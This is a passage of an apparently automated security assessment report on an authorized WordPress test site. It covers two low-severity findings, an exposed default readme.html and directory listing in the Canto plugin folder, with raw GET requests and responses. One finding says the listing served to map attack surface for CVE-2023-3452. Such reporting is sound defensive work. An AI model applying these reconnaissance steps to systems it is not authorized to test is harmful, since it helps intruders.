.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/paragraph/style.min.css */
</style>
<style id="wp-block-button-inline-css">
.wp-block-button__link{align-content:center;box-sizing:border-box;cursor:pointer;display:inline-block;height:100%;text-align:center;word-break:break-word}.wp-block-button__link.aligncenter{text-align:center}.wp-block-button__link.alignright{text-align:right}:where(.wp-block-button__link){border-radius:9999px;box-shadow:none;padding:calc(.667em + 2px) calc(1.333em + 2px);text-decoration:none}.wp-block-button[style*=text-decoration] .wp-block-button__link{text-decoration:inherit}.wp-block-buttons>.wp-block-button.has-custom-width{max-width:none}.wp-block-buttons>.wp-block-button.has-custom-width .wp-block-button__link{width:100%}.wp-block-buttons>.wp-block-button.has-custom-font-size .wp-block-button__link{font-size:inherit}.wp-block-buttons>.wp-block-button.wp-block-button__width-25{width:calc(25% - var(--wp--style--block-gap, .5em)*.75)}.wp-block-buttons>.wp-block-button.wp-block-button__width-50{width:calc(50% - var(--wp--style--block-gap, .5em)*.5)}.wp-block-buttons>.wp-block-button.wp-block-button__width-75{width:calc(75% - var(--wp--style--block-gap, .5em)*.25)}.wp-block-buttons>.wp-block-button.wp-block-button__width-100{flex-basis:100%;width:100%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-25{width:25%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-50{width:50%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-75{width:75%}.wp-block-button.is-style-squared,.wp-block-button__link.wp-block-button.is-style-squared{border-radius:0}.wp-block-button.no-border-radius,.wp-block-button__link.no-border-radius{border-radius:0!important}:root :where(.wp-block-button .wp-block-button__link.is-style-outline),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link){border:2px solid;padding:.667em 1.333em}:root :where(.wp-block-button .wp-block-button__link.is-style-outline:not(.has-text-color)),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link:not(.has-text-color)){color:currentColor}:root :where(.wp-block-button .wp-block-button__link.is-style-outline:not(.has-background)),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link:not(.has-background)){background-color:initial;background-image:none}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/button/style.min.css */
</style>
<style id="wp-block-buttons-inline-css">
.wp-block-buttons{box-sizing:border-box}.wp-block-buttons.is-vertical{flex-direction:column}.wp-block-buttons.is-vertical>.wp-block-button:last-child{margin-bottom:0}.wp-block-buttons>.wp-block-button{display:inline-block;margin:0}.wp-block-buttons.is-content-justification-left{justify-content:flex-start}.wp-block-buttons.is-content-justification-left.is-vertical{align-items:flex-start}.wp-block-buttons.is-content-justification-center{justify-content:center}.wp-block-buttons.is-content-justification-center.is-vertical{align-items:center}.wp-block-buttons.is-content-justification-right{justify-content:flex-end}.wp-block-buttons.is-content-justification-right.is-vertical{align-items:flex-end}.wp-block-buttons.is-content-justification-space-between{justify-content:space-between}.wp-block-buttons.aligncenter{text-align:center}.wp-block-buttons:not(.is-content-justification-space-between,.is-content-justification-right,.is-content-justification-left,.is-content-justification-center) .wp-block-button.aligncenter{margin-left:auto;margin-right:auto;width:100%}.wp-block-buttons[style*=text-decoration] .wp-block-button,.wp-block-buttons[style*=text-decoration] .wp-block-button__link{text-decoration:inherit}.wp-block-buttons.has-custom-font-size .wp-block-button__link{font-size:inherit}.wp-block-buttons .wp-block-button__link{width:100%}.wp-block-button.aligncenter{text-align:center}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/buttons/style.min.css */
</style>
<style id="wp-block-columns-inline-css">
.wp-block-columns{box-sizing:border-box;display:flex;flex-wrap:wrap!important}@media (min-width:782px){.wp-block-columns{flex-wrap:nowrap!important}}.wp-block-columns{align-items:normal!important}.wp-block-columns.are-vertically-aligned-top{align-items:flex-start}.wp-block-columns.are-vertically-aligned-center{align-items:center}.wp-block-columns.are-vertically-aligned-bottom{align-items:flex-end}@media (max-width:781px){.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column{flex-basis:100%!important}}@media (min-width:782px){.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column{flex-basis:0;flex-grow:1}.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column[style*=flex-basis]{flex-grow:0}}.wp-block-columns.is-not-stacked-on-mobile{flex-wrap:nowrap!important}.wp-block-columns.is-not-stacked-on-mobile>.wp-block-column{flex-basis:0;flex-grow:1}.wp-block-columns.is-not-stacked-on-mobile>.wp-block-column[style*=flex-basis]{flex-grow:0}:where(.wp-block-columns){margin-bottom:1.75em}:where(.wp-block-columns.has-background){padding:1.25em 2.375em}.wp-block-column{flex-grow:1;min-width:0;overflow-wrap:break-word;word-break:break-word}.wp-block-column.is-vertically-aligned-top{align-self:flex-start}.wp-block-column.is-vertically-aligned-center{align-self:center}.wp-block-column.is-vertically-aligned-bottom{align-self:flex-end}.wp-block-column.is-vertically-aligned-stretch{align-self:stretch}.wp-block-column.is-vertically-aligned-bottom,.wp-block-column.is-vertically-aligned-center,.wp-block-column.is-vertically-aligned-top{width:100%}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/columns/style.min.css */
</style>
<link rel='stylesheet' id='wp-block-cover-css' href='http://target.local:32812/wp-includes/blocks/cover/style.min.css?ver=7.0' media='all' />
<style id="wp-block-image-inline-css">
.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:show-content-image .4s}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull>a,.wp-block-image.alignwide>a{width:100%}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-image.is-style-circle-mask img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;backdrop-filter:blur(16px) saturate(180%);background-color:#5a5a5a40;border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:cen
```

- Evidence `ev-mr0u2mhk-3g` — `artifacts/s-0015/ev-mr0u2mhk-3g/`

Request:

```http
GET /rock-tune/contact/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Tue, 30 Jun 2026 16:00:44 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.41 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>
</body></html>
```

- Evidence `ev-mr0u3q7t-3i` — `artifacts/s-0015/ev-mr0u3q7t-3i/`

Request:

```http
GET /nonexistent-path-xyzzy/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Tue, 30 Jun 2026 16:01:35 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.41 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>
</body></html>
```

<a id="finding-8"></a>

### 8. [LOW] [info-disclosure] Exposed WordPress default file: /readme.html

- Screen: `s-0022`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

The default WordPress documentation file /readme.html is publicly accessible without authentication (HTTP 200, 7406-byte "WordPress › ReadMe" page). This is a default-install artifact that confirms the site runs WordPress and points to wp-admin/install.php and wp-config setup paths, aiding reconnaissance and targeted attacks. Note: this WP build has had the core version string removed from readme.html (no "Version X.Y" line under the logo — stripped in WP 5.x), so this file itself does NOT leak the precise WP version; the version is separately disclosed via the homepage <meta name="generator"> tag (tracked under info-disclosure::/::generator). The residual risk here is the exposed default file confirming the platform and default file layout. Best practice is to remove or block /readme.html. Negative control: a non-existent variant (/readme-nonexistent-verdict.html) returns 404 with a generic Apache error page (no WP content), distinguishing the hit from a catch-all.

**Reproduction**

```
1) GET http://target.local:32812/readme.html (no session) → 200, returns the WordPress ReadMe HTML (title "WordPress › ReadMe", links to wp-admin/install.php). Repeatable (2x identical 7406-byte bodies). 2) Negative control: GET http://target.local:32812/readme-nonexistent-verdict.html → 404 Apache "Not Found" (no WP content), proving the 200 is the genuine file, not a catch-all.
```

**Evidence**

- Evidence `ev-mr0udup1-4b` — `artifacts/s-0022/ev-mr0udup1-4b/`

Request:

```http
GET /readme-nonexistent-verdict.html HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Tue, 30 Jun 2026 16:09:27 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.41 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>
</body></html>
```

- Evidence `ev-mr0udtst-4a` — `artifacts/s-0022/ev-mr0udtst-4a/`

Request:

```http
GET /readme.html HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
connection: Keep-Alive
content-length: 7406
content-type: text/html
date: Tue, 30 Jun 2026 16:09:26 GMT
etag: "1cee-6557a00afb7df-gzip"
keep-alive: timeout=5, max=100
last-modified: Tue, 30 Jun 2026 15:12:26 GMT
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title>WordPress &#8250; ReadMe</title>
	<link rel="stylesheet" href="wp-admin/css/install.css?ver=20100228" />
</head>
<body>
<h1 id="logo">
	<a href="https://wordpress.org/"><img alt="WordPress" src="wp-admin/images/wordpress-logo.png" /></a>
</h1>
<p style="text-align: center">Semantic Personal Publishing Platform</p>

<h2>First Things First</h2>
<p>Welcome. WordPress is a very special project to me. Every developer and contributor adds something unique to the mix, and together we create something beautiful that I am proud to be a part of. Thousands of hours have gone into WordPress, and we are dedicated to making it better every day. Thank you for making it part of your world.</p>
<p style="text-align: right">&#8212; Matt Mullenweg</p>

<h2>Installation: Famous 5-minute install</h2>
<ol>
	<li>Unzip the package in an empty directory and upload everything.</li>
	<li>Open <span class="file"><a href="wp-admin/install.php">wp-admin/install.php</a></span> in your browser. It will take you through the process to set up a <code>wp-config.php</code> file with your database connection details.
		<ol>
			<li>If for some reason this does not work, do not worry. It may not work on all web hosts. Open up <code>wp-config-sample.php</code> with a text editor like WordPad or similar and fill in your database connection details.</li>
			<li>Save the file as <code>wp-config.php</code> and upload it.</li>
			<li>Open <span class="file"><a href="wp-admin/install.php">wp-admin/install.php</a></span> in your browser.</li>
		</ol>
	</li>
	<li>Once the configuration file is set up, the installer will set up the tables needed for your site. If there is an error, double check your <code>wp-config.php</code> file, and try again. If it fails again, please go to the <a href="https://wordpress.org/support/forums/">WordPress support forums</a> with as much data as you can gather.</li>
	<li><strong>If you did not enter a password, note the password given to you.</strong> If you did not provide a username, it will be <code>admin</code>.</li>
	<li>The installer should then send you to the <a href="wp-login.php">login page</a>. Sign in with the username and password you chose during the installation. If a password was generated for you, you can then click on &#8220;Profile&#8221; to change the password.</li>
</ol>

<h2>Updating</h2>
<h3>Using the Automatic Updater</h3>
<ol>
	<li>Open <span class="file"><a href="wp-admin/update-core.php">wp-admin/update-core.php</a></span> in your browser and follow the instructions.</li>
	<li>You wanted more, perhaps? That&#8217;s it!</li>
</ol>

<h3>Updating Manually</h3>
<ol>
	<li>Before you update anything, make sure you have backup copies of any files you may have modified such as <code>index.php</code>.</li>
	<li>Delete your old WordPress files, saving ones you&#8217;ve modified.</li>
	<li>Upload the new files.</li>
	<li>Point your browser to <span class="file"><a href="wp-admin/upgrade.php">/wp-admin/upgrade.php</a>.</span></li>
</ol>

<h2>Migrating from other systems</h2>
<p>WordPress can <a href="https://developer.wordpress.org/advanced-administration/wordpress/import/">import from a number of systems</a>. First you need to get WordPress installed and working as described above, before using <a href="wp-admin/import.php">our import tools</a>.</p>

<h2>System Requirements</h2>
<ul>
	<li><a href="https://www.php.net/">PHP</a> version <strong>7.4</strong> or greater.</li>
	<li><a href="https://www.mysql.com/">MySQL</a> version <strong>5.5.5</strong> or greater.</li>
</ul>

<h3>Recommendations</h3>
<ul>
	<li><a href="https://www.php.net/">PHP</a> version <strong>8.3</strong> or greater.</li>
	<li><a href="https://www.mysql.com/">MySQL</a> version <strong>8.0</strong> or greater OR <a href="https://mariadb.org/">MariaDB</a> version <strong>10.6</strong> or greater.</li>
	<li>The <a href="https://httpd.apache.org/docs/2.2/mod/mod_rewrite.html">mod_rewrite</a> Apache module.</li>
	<li><a href="https://wordpress.org/news/2016/12/moving-toward-ssl/">HTTPS</a> support.</li>
	<li>A link to <a href="https://wordpress.org/">wordpress.org</a> on your site.</li>
</ul>

<h2>Online Resources</h2>
<p>If you have any questions that are not addressed in this document, please take advantage of WordPress&#8217; numerous online resources:</p>
<dl>
	<dt><a href="https://wordpress.org/documentation/">HelpHub</a></dt>
		<dd>HelpHub is the encyclopedia of all things WordPress. It is the most comprehensive source of information for WordPress available.</dd>
	<dt><a href="https://wordpress.org/news/">The WordPress Blog</a></dt>
		<dd>This is where you&#8217;ll find the latest updates and news related to WordPress. Recent WordPress news appears in your administrative dashboard by default.</dd>
	<dt><a href="https://planet.wordpress.org/">WordPress Planet</a></dt>
		<dd>The WordPress Planet is a news aggregator that brings together posts from WordPress blogs around the web.</dd>
	<dt><a href="https://wordpress.org/support/forums/">WordPress Support Forums</a></dt>
		<dd>If you&#8217;ve looked everywhere and still cannot find an answer, the support forums are very active and have a large community ready to help. To help them help you be sure to use a descriptive thread title and describe your question in as much detail as possible.</dd>
	<dt><a href="https://make.wordpress.org/support/handbook/appendix/other-support-locations/introduction-to-irc/">WordPress <abbr>IRC</abbr> (Internet Relay Chat) Channel</a></dt>
		<dd>There is an online chat channel that is used for discussion among people who use WordPress and occasionally support topics. The above wiki page should point you in the right direction. (<a href="https://web.libera.chat/#wordpress">irc.libera.chat #wordpress</a>)</dd>
</dl>

<h2>Final Notes</h2>
<ul>
	<li>If you have any suggestions, ideas, or comments, or if you (gasp!) found a bug, join us in the <a href="https://wordpress.org/support/forums/">Support Forums</a>.</li>
	<li>WordPress has a robust plugin <abbr>API</abbr> (Application Programming Interface) that makes extending the code easy. If you are a developer interested in utilizing this, see the <a href="https://developer.wordpress.org/plugins/">Plugin Developer Handbook</a>. You shouldn&#8217;t modify any of the core code.</li>
</ul>

<h2>Share the Love</h2>
<p>WordPress has no multi-million dollar marketing campaign or celebrity sponsors, but we do have something even better&#8212;you. If you enjoy WordPress please consider telling a friend, setting it up for someone less knowledgeable than yourself, or writing the author of a media article that overlooks us.</p>

<p>WordPress is the official continuation of b2/caf&#233;log, which came from Michel V. The work has been continued by the <a href="https://wordpress.org/about/">WordPress developers</a>. If you would like to support WordPress, please consider <a href="https://wordpress.org/donate/">donating</a>.</p>

<h2>License</h2>
<p>WordPress is free software, and is released under the terms of the <abbr>GPL</abbr> (GNU General Public License) version 2 or (at your option) any later version. See <a href="license.txt">license.txt</a>.</p>

</body>
</html>
```

- Evidence `ev-mr0uehcb-4c` — `artifacts/s-0022/ev-mr0uehcb-4c/`

Request:

```http
GET /readme.html HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
connection: Keep-Alive
content-length: 7406
content-type: text/html
date: Tue, 30 Jun 2026 16:09:57 GMT
etag: "1cee-6557a00afb7df-gzip"
keep-alive: timeout=5, max=100
last-modified: Tue, 30 Jun 2026 15:12:26 GMT
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title>WordPress &#8250; ReadMe</title>
	<link rel="stylesheet" href="wp-admin/css/install.css?ver=20100228" />
</head>
<body>
<h1 id="logo">
	<a href="https://wordpress.org/"><img alt="WordPress" src="wp-admin/images/wordpress-logo.png" /></a>
</h1>
<p style="text-align: center">Semantic Personal Publishing Platform</p>

<h2>First Things First</h2>
<p>Welcome. WordPress is a very special project to me. Every developer and contributor adds something unique to the mix, and together we create something beautiful that I am proud to be a part of. Thousands of hours have gone into WordPress, and we are dedicated to making it better every day. Thank you for making it part of your world.</p>
<p style="text-align: right">&#8212; Matt Mullenweg</p>

<h2>Installation: Famous 5-minute install</h2>
<ol>
	<li>Unzip the package in an empty directory and upload everything.</li>
	<li>Open <span class="file"><a href="wp-admin/install.php">wp-admin/install.php</a></span> in your browser. It will take you through the process to set up a <code>wp-config.php</code> file with your database connection details.
		<ol>
			<li>If for some reason this does not work, do not worry. It may not work on all web hosts. Open up <code>wp-config-sample.php</code> with a text editor like WordPad or similar and fill in your database connection details.</li>
			<li>Save the file as <code>wp-config.php</code> and upload it.</li>
			<li>Open <span class="file"><a href="wp-admin/install.php">wp-admin/install.php</a></span> in your browser.</li>
		</ol>
	</li>
	<li>Once the configuration file is set up, the installer will set up the tables needed for your site. If there is an error, double check your <code>wp-config.php</code> file, and try again. If it fails again, please go to the <a href="https://wordpress.org/support/forums/">WordPress support forums</a> with as much data as you can gather.</li>
	<li><strong>If you did not enter a password, note the password given to you.</strong> If you did not provide a username, it will be <code>admin</code>.</li>
	<li>The installer should then send you to the <a href="wp-login.php">login page</a>. Sign in with the username and password you chose during the installation. If a password was generated for you, you can then click on &#8220;Profile&#8221; to change the password.</li>
</ol>

<h2>Updating</h2>
<h3>Using the Automatic Updater</h3>
<ol>
	<li>Open <span class="file"><a href="wp-admin/update-core.php">wp-admin/update-core.php</a></span> in your browser and follow the instructions.</li>
	<li>You wanted more, perhaps? That&#8217;s it!</li>
</ol>

<h3>Updating Manually</h3>
<ol>
	<li>Before you update anything, make sure you have backup copies of any files you may have modified such as <code>index.php</code>.</li>
	<li>Delete your old WordPress files, saving ones you&#8217;ve modified.</li>
	<li>Upload the new files.</li>
	<li>Point your browser to <span class="file"><a href="wp-admin/upgrade.php">/wp-admin/upgrade.php</a>.</span></li>
</ol>

<h2>Migrating from other systems</h2>
<p>WordPress can <a href="https://developer.wordpress.org/advanced-administration/wordpress/import/">import from a number of systems</a>. First you need to get WordPress installed and working as described above, before using <a href="wp-admin/import.php">our import tools</a>.</p>

<h2>System Requirements</h2>
<ul>
	<li><a href="https://www.php.net/">PHP</a> version <strong>7.4</strong> or greater.</li>
	<li><a href="https://www.mysql.com/">MySQL</a> version <strong>5.5.5</strong> or greater.</li>
</ul>

<h3>Recommendations</h3>
<ul>
	<li><a href="https://www.php.net/">PHP</a> version <strong>8.3</strong> or greater.</li>
	<li><a href="https://www.mysql.com/">MySQL</a> version <strong>8.0</strong> or greater OR <a href="https://mariadb.org/">MariaDB</a> version <strong>10.6</strong> or greater.</li>
	<li>The <a href="https://httpd.apache.org/docs/2.2/mod/mod_rewrite.html">mod_rewrite</a> Apache module.</li>
	<li><a href="https://wordpress.org/news/2016/12/moving-toward-ssl/">HTTPS</a> support.</li>
	<li>A link to <a href="https://wordpress.org/">wordpress.org</a> on your site.</li>
</ul>

<h2>Online Resources</h2>
<p>If you have any questions that are not addressed in this document, please take advantage of WordPress&#8217; numerous online resources:</p>
<dl>
	<dt><a href="https://wordpress.org/documentation/">HelpHub</a></dt>
		<dd>HelpHub is the encyclopedia of all things WordPress. It is the most comprehensive source of information for WordPress available.</dd>
	<dt><a href="https://wordpress.org/news/">The WordPress Blog</a></dt>
		<dd>This is where you&#8217;ll find the latest updates and news related to WordPress. Recent WordPress news appears in your administrative dashboard by default.</dd>
	<dt><a href="https://planet.wordpress.org/">WordPress Planet</a></dt>
		<dd>The WordPress Planet is a news aggregator that brings together posts from WordPress blogs around the web.</dd>
	<dt><a href="https://wordpress.org/support/forums/">WordPress Support Forums</a></dt>
		<dd>If you&#8217;ve looked everywhere and still cannot find an answer, the support forums are very active and have a large community ready to help. To help them help you be sure to use a descriptive thread title and describe your question in as much detail as possible.</dd>
	<dt><a href="https://make.wordpress.org/support/handbook/appendix/other-support-locations/introduction-to-irc/">WordPress <abbr>IRC</abbr> (Internet Relay Chat) Channel</a></dt>
		<dd>There is an online chat channel that is used for discussion among people who use WordPress and occasionally support topics. The above wiki page should point you in the right direction. (<a href="https://web.libera.chat/#wordpress">irc.libera.chat #wordpress</a>)</dd>
</dl>

<h2>Final Notes</h2>
<ul>
	<li>If you have any suggestions, ideas, or comments, or if you (gasp!) found a bug, join us in the <a href="https://wordpress.org/support/forums/">Support Forums</a>.</li>
	<li>WordPress has a robust plugin <abbr>API</abbr> (Application Programming Interface) that makes extending the code easy. If you are a developer interested in utilizing this, see the <a href="https://developer.wordpress.org/plugins/">Plugin Developer Handbook</a>. You shouldn&#8217;t modify any of the core code.</li>
</ul>

<h2>Share the Love</h2>
<p>WordPress has no multi-million dollar marketing campaign or celebrity sponsors, but we do have something even better&#8212;you. If you enjoy WordPress please consider telling a friend, setting it up for someone less knowledgeable than yourself, or writing the author of a media article that overlooks us.</p>

<p>WordPress is the official continuation of b2/caf&#233;log, which came from Michel V. The work has been continued by the <a href="https://wordpress.org/about/">WordPress developers</a>. If you would like to support WordPress, please consider <a href="https://wordpress.org/donate/">donating</a>.</p>

<h2>License</h2>
<p>WordPress is free software, and is released under the terms of the <abbr>GPL</abbr> (GNU General Public License) version 2 or (at your option) any later version. See <a href="license.txt">license.txt</a>.</p>

</body>
</html>
```

<a id="finding-9"></a>

### 9. [LOW] [misconfig] Directory Listing Enabled on Canto Plugin Source Directory

- Screen: `s-0027`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

Apache directory listing is enabled on /wp-content/plugins/canto/includes/lib/, exposing the full file listing of the plugin's PHP source files (class-canto-admin-api.php 14K, class-canto-media.php 6.5K, copy-media.php 9.3K, etc.) to unauthenticated users. The parent directory /wp-content/plugins/canto/ correctly returns an empty response with no listing, so the misconfiguration is subdirectory-specific. This aids reconnaissance and was used here to enumerate attack surface for CVE-2023-3452.

**Reproduction**

```
1. GET http://target/wp-content/plugins/canto/includes/lib/ — returns an Apache directory index listing all PHP files.\n2. Confirm: parent directory /wp-content/plugins/canto/ returns 200 with empty body (no listing) — the sub-path is selectively open.
```

**Evidence**

- Evidence `ev-mr0uomwx-5f` — `artifacts/s-0027/ev-mr0uomwx-5f/`

Request:

```http
GET /wp-content/plugins/canto/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 0
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:17:51 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.41 (Ubuntu)
```

- Evidence `ev-mr0uulc8-6b` — `artifacts/s-0027/ev-mr0uulc8-6b/`

Request:

```http
GET /wp-content/plugins/canto/includes/lib/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 2948
content-type: text/html;charset=UTF-8
date: Tue, 30 Jun 2026 16:22:28 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /wp-content/plugins/canto/includes/lib</title>
 </head>
 <body>
<h1>Index of /wp-content/plugins/canto/includes/lib</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/wp-content/plugins/canto/includes/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="class-canto-admin-api.php">class-canto-admin-api.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right"> 14K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="class-canto-attachment.php">class-canto-attachment.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.5K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="class-canto-media.php">class-canto-media.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">6.5K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="copy-media.php">copy-media.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">9.3K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="detail.php">detail.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.0K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="download.php">download.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.3K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="get.php">get.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">2.7K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="media-upload.php">media-upload.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">3.2K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="sizes.php">sizes.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.6K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="tree.php">tree.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.3K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>
</body></html>
```

- Evidence `ev-mr0uw6s5-6d` — `artifacts/s-0027/ev-mr0uw6s5-6d/`

Request:

```http
GET /wp-content/plugins/canto/includes/lib/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 2948
content-type: text/html;charset=UTF-8
date: Tue, 30 Jun 2026 16:23:43 GMT
